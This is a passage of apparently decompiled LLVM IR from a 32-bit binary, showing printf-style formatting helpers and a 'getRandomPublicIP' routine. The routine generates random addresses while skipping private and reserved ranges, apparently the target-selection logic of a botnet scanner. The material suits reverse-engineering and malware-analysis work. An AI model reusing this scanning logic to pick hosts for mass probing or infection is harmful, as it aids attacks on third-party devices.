  %v6_804fa7e = inttoptr i32 %v5_804fa7e to i32*
  store i32 %tmp3, i32* %v6_804fa7e, align 4
  %v1_804fa81 = call i32 @printi(i32 %v1_804fa64)
  store i32 %v1_804fa81, i32* %eax.global-to-local, align 4
  %v0_804fa86 = load i32, i32* @esp, align 4
  %v1_804fa86 = add i32 %v0_804fa86, 32
  %v5_804fa89 = add i32 %v1_804fa81, %stack_var_-28.160
  br label %dec_label_pc_804fb1a

dec_label_pc_804fa91:                             ; preds = %dec_label_pc_804fa58
  store i32 %v4_804f989.lcssa, i32* %eax.global-to-local, align 4
  %v2_804fa94 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804fa94 = zext i8 %v2_804fa94 to i32
  %v6_804fa94 = or i32 %v3_804fa94, %v5_804f98c.lcssa
  store i32 %v6_804fa94, i32* %eax.global-to-local, align 4
  %v10_804fa96 = icmp eq i8 %v2_804fa94, 117
  %v1_804fa98 = icmp eq i1 %v10_804fa96, false
  br i1 %v1_804fa98, label %dec_label_pc_804fac7, label %dec_label_pc_804fa9a

dec_label_pc_804fa9a:                             ; preds = %dec_label_pc_804fa91
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804fa9d = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804faa5 = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804faa5 = load i32, i32* %v1_804faa5, align 4
  store i32 %v2_804faa5, i32* %eax.global-to-local, align 4
  %v1_804faaa = add i32 %v0_804fb08, -8
  %v2_804faaa = inttoptr i32 %v1_804faaa to i32*
  store i32 97, i32* %v2_804faaa, align 4
  %v5_804faac = add i32 %v0_804fb08, -12
  %v6_804faac = inttoptr i32 %v5_804faac to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804faac, align 4
  %v5_804faaf = add i32 %v0_804fb08, -16
  %v6_804faaf = inttoptr i32 %v5_804faaf to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804faaf, align 4
  %v1_804fab2 = add i32 %v0_804fb08, -20
  %v2_804fab2 = inttoptr i32 %v1_804fab2 to i32*
  store i32 0, i32* %v2_804fab2, align 4
  %v1_804fab4 = add i32 %v0_804fb08, -24
  %v2_804fab4 = inttoptr i32 %v1_804fab4 to i32*
  store i32 10, i32* %v2_804fab4, align 4
  %v0_804fab6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fab6 = add i32 %v0_804fb08, -28
  %v3_804fab6 = inttoptr i32 %v2_804fab6 to i32*
  store i32 %v0_804fab6, i32* %v3_804fab6, align 4
  %v5_804fab7 = add i32 %v0_804fb08, -32
  %v6_804fab7 = inttoptr i32 %v5_804fab7 to i32*
  store i32 %tmp3, i32* %v6_804fab7, align 4
  %v1_804faba = call i32 @printi(i32 %v1_804fa9d)
  store i32 %v1_804faba, i32* %eax.global-to-local, align 4
  %v0_804fabf = load i32, i32* @esp, align 4
  %v1_804fabf = add i32 %v0_804fabf, 32
  %v5_804fac2 = add i32 %v1_804faba, %stack_var_-28.160
  br label %dec_label_pc_804fb1a

dec_label_pc_804fac7:                             ; preds = %dec_label_pc_804fa91
  store i32 %v4_804f989.lcssa, i32* %eax.global-to-local, align 4
  %v2_804faca = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804faca = zext i8 %v2_804faca to i32
  %v6_804faca = or i32 %v3_804faca, %v5_804f98c.lcssa
  store i32 %v6_804faca, i32* %eax.global-to-local, align 4
  %v10_804facc = icmp eq i8 %v2_804faca, 99
  %v1_804face = icmp eq i1 %v10_804facc, false
  br i1 %v1_804face, label %dec_label_pc_804fb1a, label %dec_label_pc_804fad0

dec_label_pc_804fad0:                             ; preds = %dec_label_pc_804fac7
  store i32 %stack_var_12.158, i32* @edx, align 4
  %v1_804fad3 = add i32 %stack_var_12.158, 4
  store i32 %stack_var_12.158, i32* %eax.global-to-local, align 4
  %v1_804fadb = inttoptr i32 %stack_var_12.158 to i32*
  %v2_804fadb = load i32, i32* %v1_804fadb, align 4
  store i32 %v2_804fadb, i32* %stack_var_-6, align 4
  %v5_804fae4 = add i32 %v0_804fb08, -4
  %v6_804fae4 = inttoptr i32 %v5_804fae4 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804fae4, align 4
  %v5_804fae7 = add i32 %v0_804fb08, -8
  %v6_804fae7 = inttoptr i32 %v5_804fae7 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804fae7, align 4
  store i32 %v2_804faea, i32* %eax.global-to-local, align 4
  %v2_804faed = add i32 %v0_804fb08, -12
  %v3_804faed = inttoptr i32 %v2_804faed to i32*
  store i32 %v2_804faea, i32* %v3_804faed, align 4
  %v5_804faee = add i32 %v0_804fb08, -16
  %v6_804faee = inttoptr i32 %v5_804faee to i32*
  store i32 %tmp3, i32* %v6_804faee, align 4
  %v0_804faf1 = load i32, i32* %stack_var_-6, align 4
  %v6_804faf1 = call i32 @prints(i32 %v0_804faf1, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804faf1, i32* %eax.global-to-local, align 4
  %v0_804faf6 = load i32, i32* @esp, align 4
  %v1_804faf6 = add i32 %v0_804faf6, 16
  %v5_804faf9 = add i32 %v6_804faf1, %stack_var_-28.160
  br label %dec_label_pc_804fb1a

dec_label_pc_804fafe:                             ; preds = %dec_label_pc_804f931, %dec_label_pc_804f907
  %stack_var_8.2 = phi i8* [ %stack_var_8.461, %dec_label_pc_804f907 ], [ %v22_804f914, %dec_label_pc_804f931 ]
  %v4_804fafe = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_804fafe, i32* %eax.global-to-local, align 4
  %v2_804fb01 = load i8, i8* %stack_var_8.2, align 1
  %v3_804fb01 = zext i8 %v2_804fb01 to i32
  store i32 %v3_804fb01, i32* %eax.global-to-local, align 4
  %v2_804fb0b = add i32 %v0_804fb08, -12
  %v3_804fb0b = inttoptr i32 %v2_804fb0b to i32*
  store i32 %v3_804fb01, i32* %v3_804fb0b, align 4
  %v5_804fb0c = add i32 %v0_804fb08, -16
  %v6_804fb0c = inttoptr i32 %v5_804fb0c to i32*
  store i32 %tmp3, i32* %v6_804fb0c, align 4
  %v2_804fb0f = inttoptr i32 %stack_var_-28.160 to i32*
  %v3_804fb0f = call i32 @printchar(i32* %v2_804fb0f, i32 %stack_var_-24.157)
  store i32 %v3_804fb0f, i32* %eax.global-to-local, align 4
  %v0_804fb14 = load i32, i32* @esp, align 4
  %v1_804fb14 = add i32 %v0_804fb14, 16
  %v4_804fb17 = add i32 %stack_var_-28.160, 1
  br label %dec_label_pc_804fb1a

dec_label_pc_804fb1a:                             ; preds = %dec_label_pc_804fac7, %dec_label_pc_804fad0, %dec_label_pc_804fa9a, %dec_label_pc_804fa61, %dec_label_pc_804fa28, %dec_label_pc_804f9ef, %dec_label_pc_804f9c9, %dec_label_pc_804fafe
  %v4_804f9cc72 = phi i32 [ %v1_804fb14, %dec_label_pc_804fafe ], [ %v0_804fb08, %dec_label_pc_804fac7 ], [ %v1_804faf6, %dec_label_pc_804fad0 ], [ %v1_804fabf, %dec_label_pc_804fa9a ], [ %v1_804fa86, %dec_label_pc_804fa61 ], [ %v1_804fa4d, %dec_label_pc_804fa28 ], [ %v1_804fa14, %dec_label_pc_804f9ef ], [ %v1_804f9db, %dec_label_pc_804f9c9 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.157, %dec_label_pc_804fafe ], [ %stack_var_-24.157, %dec_label_pc_804fac7 ], [ %stack_var_-24.157, %dec_label_pc_804fad0 ], [ %stack_var_-24.157, %dec_label_pc_804fa9a ], [ %stack_var_-24.157, %dec_label_pc_804fa61 ], [ %stack_var_-24.157, %dec_label_pc_804fa28 ], [ %stack_var_-24.157, %dec_label_pc_804f9ef ], [ %v2_804f9af, %dec_label_pc_804f9c9 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.158, %dec_label_pc_804fafe ], [ %stack_var_12.158, %dec_label_pc_804fac7 ], [ %v1_804fad3, %dec_label_pc_804fad0 ], [ %v1_804fa9d, %dec_label_pc_804fa9a ], [ %v1_804fa64, %dec_label_pc_804fa61 ], [ %v1_804fa2b, %dec_label_pc_804fa28 ], [ %v1_804f9f2, %dec_label_pc_804f9ef ], [ %v1_804f9a7, %dec_label_pc_804f9c9 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_804fafe ], [ %stack_var_8.1.lcssa, %dec_label_pc_804fac7 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804fad0 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804fa9a ], [ %stack_var_8.1.lcssa, %dec_label_pc_804fa61 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804fa28 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804f9ef ], [ %stack_var_8.1.lcssa, %dec_label_pc_804f9c9 ]
  %stack_var_-28.0 = phi i32 [ %v4_804fb17, %dec_label_pc_804fafe ], [ %stack_var_-28.160, %dec_label_pc_804fac7 ], [ %v5_804faf9, %dec_label_pc_804fad0 ], [ %v5_804fac2, %dec_label_pc_804fa9a ], [ %v5_804fa89, %dec_label_pc_804fa61 ], [ %v5_804fa50, %dec_label_pc_804fa28 ], [ %v5_804fa17, %dec_label_pc_804f9ef ], [ %v5_804f9de, %dec_label_pc_804f9c9 ]
  %v4_804fb1a = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804fb1a = add i32 %v4_804fb1a, 1
  %stack_var_8.4 = inttoptr i32 %v5_804fb1a to i8*
  store i32 %v5_804fb1a, i32* %eax.global-to-local, align 4
  %v2_804fb20 = load i8, i8* %stack_var_8.4, align 1
  %v3_804fb20 = zext i8 %v2_804fb20 to i32
  %v5_804fb20 = and i32 %v5_804fb1a, -256
  %v6_804fb20 = or i32 %v3_804fb20, %v5_804fb20
  store i32 %v6_804fb20, i32* %eax.global-to-local, align 4
  %v4_804fb22 = icmp eq i8 %v2_804fb20, 0
  %v1_804fb24 = icmp eq i1 %v4_804fb22, false
  br i1 %v1_804fb24, label %dec_label_pc_804f907, label %dec_label_pc_804fb2a

dec_label_pc_804fb2a:                             ; preds = %dec_label_pc_804fb1a, %dec_label_pc_804f914, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.160, %dec_label_pc_804f914 ], [ %stack_var_-28.0, %dec_label_pc_804fb1a ]
  %v4_804fb2a = icmp eq i32* %arg1, null
  br i1 %v4_804fb2a, label %dec_label_pc_804fb38, label %dec_label_pc_804fb30

dec_label_pc_804fb30:                             ; preds = %dec_label_pc_804fb2a
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v2_804fb33 = load i32, i32* %arg1, align 4
  store i32 %v2_804fb33, i32* %eax.global-to-local, align 4
  %v1_804fb35 = inttoptr i32 %v2_804fb33 to i8*
  store i8 0, i8* %v1_804fb35, align 1
  br label %dec_label_pc_804fb38

dec_label_pc_804fb38:                             ; preds = %dec_label_pc_804fb2a, %dec_label_pc_804fb30
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  %v2_804fb3b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb3b, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i32 %v5_804fb20, { 1, 0 }
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804fb1a, { 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_804f9af, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_804f98c.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_804f989.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804f953, { 1, 2, 3, 0 }
  uselistorder i8* %v22_804f914, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.157, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.158, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in59, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.160, { 0, 3, 2, 1, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 %v0_804fb08, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 58, 59, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 45, 46, 47, 43, 63, 62, 48, 49, 61, 60, 50, 51, 52, 53, 54, 55, 56, 57, 65, 64 }
  uselistorder i32 (i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_804fb38, { 1, 0 }
  uselistorder label %dec_label_pc_804fb1a, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804f9c9, { 1, 0 }
  uselistorder label %dec_label_pc_804f99b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f992, { 1, 0 }
  uselistorder label %dec_label_pc_804f953, { 1, 0 }
  uselistorder label %dec_label_pc_804f907, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_804fb46 = ptrtoint i32* %stack_var_12 to i32
  %v4_804fb57 = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_804fb46)
  ret i32 %v4_804fb57
}

define i32 @getRandomPublicIP() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fb64 = load i32, i32* @edi, align 4
  %v0_804fb65 = load i32, i32* @esi, align 4
  %v0_804fb66 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb66, i32* %stack_var_-16, align 4
  %v2_804fb71 = call i32 @random()
  store i32 224, i32* @ecx, align 4
  %v2_804fb81 = ashr i32 %v2_804fb71, 31
  %v2_804fb84 = zext i32 %v2_804fb71 to i64
  %v4_804fb84 = zext i32 %v2_804fb81 to i64
  %v5_804fb84 = mul nuw i64 %v4_804fb84, 4294967296
  %v6_804fb84 = or i64 %v5_804fb84, %v2_804fb84
  %v10_804fb84 = srem i64 %v6_804fb84, 224
  %v6_804fb88 = trunc i64 %v10_804fb84 to i8
  %v2_804fb8b = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804fb9b = ashr i32 %v2_804fb8b, 31
  %v2_804fb9e = zext i32 %v2_804fb8b to i64
  %v4_804fb9e = zext i32 %v2_804fb9b to i64
  %v5_804fb9e = mul nuw i64 %v4_804fb9e, 4294967296
  %v6_804fb9e = or i64 %v5_804fb9e, %v2_804fb9e
  %v10_804fb9e = srem i64 %v6_804fb9e, 255
  %v1_804fba2 = trunc i64 %v10_804fb9e to i8
  %v1_804fba5 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804fbb5 = ashr i32 %v1_804fba5, 31
  %v2_804fbb8 = zext i32 %v1_804fba5 to i64
  %v4_804fbb8 = zext i32 %v2_804fbb5 to i64
  %v5_804fbb8 = mul nuw i64 %v4_804fbb8, 4294967296
  %v6_804fbb8 = or i64 %v5_804fbb8, %v2_804fbb8
  %v10_804fbb8 = srem i64 %v6_804fbb8, 255
  %v1_804fbbc = trunc i64 %v10_804fbb8 to i8
  %v1_804fbbf = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804fbcf = ashr i32 %v1_804fbbf, 31
  %v2_804fbd2 = zext i32 %v1_804fbbf to i64
  %v4_804fbd2 = zext i32 %v2_804fbcf to i64
  %v5_804fbd2 = mul nuw i64 %v4_804fbd2, 4294967296
  %v6_804fbd2 = or i64 %v5_804fbd2, %v2_804fbd2
  br label %dec_label_pc_804fc43

dec_label_pc_804fbdb:                             ; preds = %dec_label_pc_804fc95, %dec_label_pc_804fdad, %dec_label_pc_804fd9b, %dec_label_pc_804fd90, %dec_label_pc_804fd7e, %dec_label_pc_804fd6c, %dec_label_pc_804fd53, %dec_label_pc_804fd3a, %dec_label_pc_804fd28, %dec_label_pc_804fd0f, %dec_label_pc_804fcf6, %dec_label_pc_804fceb, %dec_label_pc_804fcd9, %dec_label_pc_804fcc7, %dec_label_pc_804fcae, %dec_label_pc_804fc7c, %dec_label_pc_804fc6a, %dec_label_pc_804fc5f, %dec_label_pc_804fc4a, %dec_label_pc_804fc43
  %v0_804fbdb = call i32 @random()
  store i32 224, i32* @ecx, align 4
  %v2_804fbeb = ashr i32 %v0_804fbdb, 31
  %v2_804fbee = zext i32 %v0_804fbdb to i64
  %v4_804fbee = zext i32 %v2_804fbeb to i64
  %v5_804fbee = mul nuw i64 %v4_804fbee, 4294967296
  %v6_804fbee = or i64 %v5_804fbee, %v2_804fbee
  %v10_804fbee = srem i64 %v6_804fbee, 224
  %v6_804fbf2 = trunc i64 %v10_804fbee to i8
  %v2_804fbf5 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804fc05 = ashr i32 %v2_804fbf5, 31
  %v2_804fc08 = zext i32 %v2_804fbf5 to i64
  %v4_804fc08 = zext i32 %v2_804fc05 to i64
  %v5_804fc08 = mul nuw i64 %v4_804fc08, 4294967296
  %v6_804fc08 = or i64 %v5_804fc08, %v2_804fc08
  %v10_804fc08 = srem i64 %v6_804fc08, 255
  %v1_804fc0c = trunc i64 %v10_804fc08 to i8
  %v1_804fc0f = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804fc1f = ashr i32 %v1_804fc0f, 31
  %v2_804fc22 = zext i32 %v1_804fc0f to i64
  %v4_804fc22 = zext i32 %v2_804fc1f to i64
  %v5_804fc22 = mul nuw i64 %v4_804fc22, 4294967296
  %v6_804fc22 = or i64 %v5_804fc22, %v2_804fc22
  %v10_804fc22 = srem i64 %v6_804fc22, 255
  %v1_804fc26 = trunc i64 %v10_804fc22 to i8
  %v1_804fc29 = call i32 @random()
  store i32 255, i32* @ecx, align 4
  %v2_804fc39 = ashr i32 %v1_804fc29, 31
  %v2_804fc3c = zext i32 %v1_804fc29 to i64
  %v4_804fc3c = zext i32 %v2_804fc39 to i64
  %v5_804fc3c = mul nuw i64 %v4_804fc3c, 4294967296
  %v6_804fc3c = or i64 %v5_804fc3c, %v2_804fc3c
  br label %dec_label_pc_804fc43

dec_label_pc_804fc43:                             ; preds = %entry, %dec_label_pc_804fbdb
  %v6_804fbd2.sink = phi i64 [ %v6_804fbd2, %entry ], [ %v6_804fc3c, %dec_label_pc_804fbdb ]
  %stack_var_-19.0 = phi i8 [ %v1_804fba2, %entry ], [ %v1_804fc0c, %dec_label_pc_804fbdb ]
  %stack_var_-18.0 = phi i8 [ %v1_804fbbc, %entry ], [ %v1_804fc26, %dec_label_pc_804fbdb ]
  %stack_var_-20.0 = phi i8 [ %v6_804fb88, %entry ], [ %v6_804fbf2, %dec_label_pc_804fbdb ]
  %v10_804fbd2 = srem i64 %v6_804fbd2.sink, 255
  %extract.t = trunc i64 %v10_804fbd2 to i32
  %v4_804fc43 = sext i8 %stack_var_-20.0 to i32
  %v4_804fc46 = icmp eq i8 %stack_var_-20.0, 0
  br i1 %v4_804fc46, label %dec_label_pc_804fbdb, label %dec_label_pc_804fc4a

dec_label_pc_804fc4a:                             ; preds = %dec_label_pc_804fc43
  %v10_804fc4d = icmp eq i8 %stack_var_-20.0, 10
  br i1 %v10_804fc4d, label %dec_label_pc_804fbdb, label %dec_label_pc_804fc51

dec_label_pc_804fc51:                             ; preds = %dec_label_pc_804fc4a
  %v10_804fc54 = icmp eq i8 %stack_var_-20.0, 100
  %v1_804fc56 = icmp eq i1 %v10_804fc54, false
  br i1 %v1_804fc56, label %dec_label_pc_804fc6a, label %dec_label_pc_804fc58

dec_label_pc_804fc58:                             ; preds = %dec_label_pc_804fc51
  %tmp54 = icmp ult i8 %stack_var_-19.0, 64
  br i1 %tmp54, label %dec_label_pc_804fc6a, label %dec_label_pc_804fc5f

dec_label_pc_804fc5f:                             ; preds = %dec_label_pc_804fc58
  %v5_804fc62 = icmp slt i8 %stack_var_-19.0, 0
  %v1_804fc64 = icmp eq i1 %v5_804fc62, false
  br i1 %v1_804fc64, label %dec_label_pc_804fbdb, label %dec_label_pc_804fc6a

dec_label_pc_804fc6a:                             ; preds = %dec_label_pc_804fc5f, %dec_label_pc_804fc58, %dec_label_pc_804fc51
  %v10_804fc6d = icmp eq i8 %stack_var_-20.0, 127
  br i1 %v10_804fc6d, label %dec_label_pc_804fbdb, label %dec_label_pc_804fc75

dec_label_pc_804fc75:                             ; preds = %dec_label_pc_804fc6a
  %v11_804fc78 = icmp eq i8 %stack_var_-20.0, -87
  %v1_804fc7a = icmp eq i1 %v11_804fc78, false
  br i1 %v1_804fc7a, label %dec_label_pc_804fc87, label %dec_label_pc_804fc7c

dec_label_pc_804fc7c:                             ; preds = %dec_label_pc_804fc75
  %v11_804fc7f = icmp eq i8 %stack_var_-19.0, -2
  br i1 %v11_804fc7f, label %dec_label_pc_804fbdb, label %dec_label_pc_804fc87

dec_label_pc_804fc87:                             ; preds = %dec_label_pc_804fc7c, %dec_label_pc_804fc75
  %v11_804fc8a = icmp eq i8 %stack_var_-20.0, -84
  %v1_804fc8c = icmp eq i1 %v11_804fc8a, false
  br i1 %v1_804fc8c, label %dec_label_pc_804fca0, label %dec_label_pc_804fc8e

dec_label_pc_804fc8e:                             ; preds = %dec_label_pc_804fc87
  %tmp55 = icmp ult i8 %stack_var_-19.0, 17
  br i1 %tmp55, label %dec_label_pc_804fc95, label %dec_label_pc_804fca0

dec_label_pc_804fc95:                             ; preds = %dec_label_pc_804fc8e
  br label %dec_label_pc_804fbdb

dec_label_pc_804fca0:                             ; preds = %dec_label_pc_804fc8e, %dec_label_pc_804fc87
  %v8_804fca3 = icmp eq i8 %stack_var_-20.0, -64
  %v1_804fca5 = icmp eq i1 %v8_804fca3, false
  br i1 %v1_804fca5, label %dec_label_pc_804fcd2, label %dec_label_pc_804fca7

dec_label_pc_804fca7:                             ; preds = %dec_label_pc_804fca0
  %v4_804fcaa = icmp eq i8 %stack_var_-19.0, 0
  %v1_804fcac = icmp eq i1 %v4_804fcaa, false
  br i1 %v1_804fcac, label %dec_label_pc_804fcc0, label %dec_label_pc_804fcae

dec_label_pc_804fcae:                             ; preds = %dec_label_pc_804fca7
  %v10_804fcb1 = icmp eq i8 %stack_var_-18.0, 2
  br i1 %v10_804fcb1, label %dec_label_pc_804fbdb, label %dec_label_pc_804fcc0

dec_label_pc_804fcc0:                             ; preds = %dec_label_pc_804fcae, %dec_label_pc_804fca7
  %v10_804fcc3 = icmp eq i8 %stack_var_-19.0, 88
  %v1_804fcc5 = icmp eq i1 %v10_804fcc3, false
  br i1 %v1_804fcc5, label %dec_label_pc_804fcd9, label %dec_label_pc_804fcc7

dec_label_pc_804fcc7:                             ; preds = %dec_label_pc_804fcc0
  %v10_804fcca = icmp eq i8 %stack_var_-18.0, 99
  br i1 %v10_804fcca, label %dec_label_pc_804fbdb, label %dec_label_pc_804fcd9

dec_label_pc_804fcd2:                             ; preds = %dec_label_pc_804fca0
  br label %dec_label_pc_804fce4

dec_label_pc_804fcd9:                             ; preds = %dec_label_pc_804fcc7, %dec_label_pc_804fcc0
  %v11_804fcdc = icmp eq i8 %stack_var_-19.0, -88
  br i1 %v11_804fcdc, label %dec_label_pc_804fbdb, label %dec_label_pc_804fce4

dec_label_pc_804fce4:                             ; preds = %dec_label_pc_804fcd2, %dec_label_pc_804fcd9
  %v11_804fce7 = icmp eq i8 %stack_var_-20.0, -58
  %v1_804fce9 = icmp eq i1 %v11_804fce7, false
  br i1 %v1_804fce9, label %dec_label_pc_804fd01.thread, label %dec_label_pc_804fceb

dec_label_pc_804fd01.thread:                      ; preds = %dec_label_pc_804fce4
  br label %dec_label_pc_804fd1a

dec_label_pc_804fceb:                             ; preds = %dec_label_pc_804fce4
  %v10_804fcee = icmp eq i8 %stack_var_-19.0, 18
  br i1 %v10_804fcee, label %dec_label_pc_804fbdb, label %dec_label_pc_804fcf6

dec_label_pc_804fcf6:                             ; preds = %dec_label_pc_804fceb
  %v10_804fcf9 = icmp eq i8 %stack_var_-19.0, 19
  br i1 %v10_804fcf9, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd08

dec_label_pc_804fd08:                             ; preds = %dec_label_pc_804fcf6
  %v10_804fd0b = icmp eq i8 %stack_var_-19.0, 51
  %v1_804fd0d = icmp eq i1 %v10_804fd0b, false
  br i1 %v1_804fd0d, label %dec_label_pc_804fd1a, label %dec_label_pc_804fd0f

dec_label_pc_804fd0f:                             ; preds = %dec_label_pc_804fd08
  %v10_804fd12 = icmp eq i8 %stack_var_-18.0, 100
  br i1 %v10_804fd12, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd1a

dec_label_pc_804fd1a:                             ; preds = %dec_label_pc_804fd01.thread, %dec_label_pc_804fd0f, %dec_label_pc_804fd08
  %v11_804fd1d = icmp eq i8 %stack_var_-20.0, -53
  %v1_804fd1f = icmp eq i1 %v11_804fd1d, false
  br i1 %v1_804fd1f, label %dec_label_pc_804fd33, label %dec_label_pc_804fd21

dec_label_pc_804fd21:                             ; preds = %dec_label_pc_804fd1a
  %v4_804fd24 = icmp eq i8 %stack_var_-19.0, 0
  %v1_804fd26 = icmp eq i1 %v4_804fd24, false
  br i1 %v1_804fd26, label %dec_label_pc_804fd33, label %dec_label_pc_804fd28

dec_label_pc_804fd28:                             ; preds = %dec_label_pc_804fd21
  %v10_804fd2b = icmp eq i8 %stack_var_-18.0, 113
  br i1 %v10_804fd2b, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd33

dec_label_pc_804fd33:                             ; preds = %dec_label_pc_804fd28, %dec_label_pc_804fd21, %dec_label_pc_804fd1a
  %v10_804fd36 = icmp eq i8 %stack_var_-20.0, 62
  %v1_804fd38 = icmp eq i1 %v10_804fd36, false
  br i1 %v1_804fd38, label %dec_label_pc_804fd45, label %dec_label_pc_804fd3a

dec_label_pc_804fd3a:                             ; preds = %dec_label_pc_804fd33
  %tmp56 = icmp ult i8 %stack_var_-19.0, 31
  br i1 %tmp56, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd45

dec_label_pc_804fd45:                             ; preds = %dec_label_pc_804fd3a, %dec_label_pc_804fd33
  %v11_804fd48 = icmp eq i8 %stack_var_-20.0, -49
  %v1_804fd4a = icmp eq i1 %v11_804fd48, false
  br i1 %v1_804fd4a, label %dec_label_pc_804fd5e, label %dec_label_pc_804fd4c

dec_label_pc_804fd4c:                             ; preds = %dec_label_pc_804fd45
  %tmp57 = icmp ult i8 %stack_var_-19.0, 31
  br i1 %tmp57, label %dec_label_pc_804fd5e, label %dec_label_pc_804fd53

dec_label_pc_804fd53:                             ; preds = %dec_label_pc_804fd4c
  %tmp58 = icmp ult i8 %stack_var_-18.0, 121
  br i1 %tmp58, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd5e

dec_label_pc_804fd5e:                             ; preds = %dec_label_pc_804fd53, %dec_label_pc_804fd4c, %dec_label_pc_804fd45
  %v10_804fd61 = icmp eq i8 %stack_var_-20.0, 65
  %v1_804fd63 = icmp eq i1 %v10_804fd61, false
  br i1 %v1_804fd63, label %dec_label_pc_804fd77, label %dec_label_pc_804fd65

dec_label_pc_804fd65:                             ; preds = %dec_label_pc_804fd5e
  %tmp = icmp ult i8 %stack_var_-19.0, -32
  br i1 %tmp, label %dec_label_pc_804fd77, label %dec_label_pc_804fd6c

dec_label_pc_804fd6c:                             ; preds = %dec_label_pc_804fd65
  %tmp60 = icmp ult i8 %stack_var_-18.0, -29
  br i1 %tmp60, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd77

dec_label_pc_804fd77:                             ; preds = %dec_label_pc_804fd6c, %dec_label_pc_804fd65, %dec_label_pc_804fd5e
  %v11_804fd7a = icmp eq i8 %stack_var_-20.0, -61
  %v1_804fd7c = icmp eq i1 %v11_804fd7a, false
  br i1 %v1_804fd7c, label %dec_label_pc_804fd89, label %dec_label_pc_804fd7e

dec_label_pc_804fd7e:                             ; preds = %dec_label_pc_804fd77
  %v10_804fd81 = icmp eq i8 %stack_var_-19.0, 10
  br i1 %v10_804fd81, label %dec_label_pc_804fbdb, label %dec_label_pc_804fd89

dec_label_pc_804fd89:                             ; preds = %dec_label_pc_804fd7e, %dec_label_pc_804fd77
  %v11_804fd8c = icmp eq i8 %stack_var_-20.0, -40
  %v1_804fd8e = icmp eq i1 %v11_804fd8c, false
  %.pre53 = zext i8 %stack_var_-19.0 to i32
